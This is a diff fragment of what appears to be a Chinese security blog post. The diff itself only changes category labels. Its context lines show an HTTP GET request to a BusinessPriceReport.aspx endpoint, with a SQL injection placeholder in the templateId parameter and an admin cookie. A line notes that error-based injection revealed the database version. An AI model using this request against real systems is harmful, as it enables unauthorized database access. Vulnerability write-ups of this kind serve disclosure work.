@@ -33,11 +33,11 @@ protected void Page_Load(object sender, EventArgs e)
 
 深入探索
 
-计算机科学
+软件实用程序
 
-参考信息
+计算机安全
 
-data
+字典与百科全书
 
 ```
 GET /m/Dingding/Product/BusinessPriceReport.aspx?templateId='SQLI_POC-- HTTP/1.1
@@ -49,4 +49,4 @@ Cookie: UserCookie={"empId":"admin","corpId": "1"}
 
 成功通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")在响应回显数据库版本信息
 
-黑客与破解
+脚本语言
